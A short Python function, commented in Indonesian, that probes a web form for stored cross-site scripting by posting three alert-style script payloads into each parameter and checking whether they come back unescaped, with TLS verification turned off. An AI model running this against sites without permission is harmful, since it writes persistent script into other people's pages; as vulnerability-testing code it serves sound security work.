import requests
import uuid
from bs4 import BeautifulSoup

def test_stored_xss(url, params):
    """Test Stored XSS dengan unique identifier."""
    results = []
    
    # Generate unique payload
    unique_id = str(uuid.uuid4())[:8]
    payloads = [
        f"<script>alert('{unique_id}')</script>",
        f"<img src=x onerror=alert('{unique_id}')>",
        f"<svg onload=alert('{unique_id}')>",
    ]
    
    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                # POST payload
                post_response = requests.post(url, data=test_params, timeout=10, verify=False)
                
                # GET untuk cek apakah payload tersimpan
                get_response = requests.get(url, timeout=10, verify=False)
                
                # Cek apakah unique_id muncul di response
                if unique_id in get_response.text:
                    # Cek apakah payload tidak di-encode
                    if payload in get_response.text or payload.replace('<', '&lt;').replace('>', '&gt;') not in get_response.text:
                        results.append({
                            "type": "Stored XSS",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"Payload tersimpan dan muncul di response (ID: {unique_id})"
                        })
                        return results
                        
            except requests.RequestException:
                pass
    
    return results
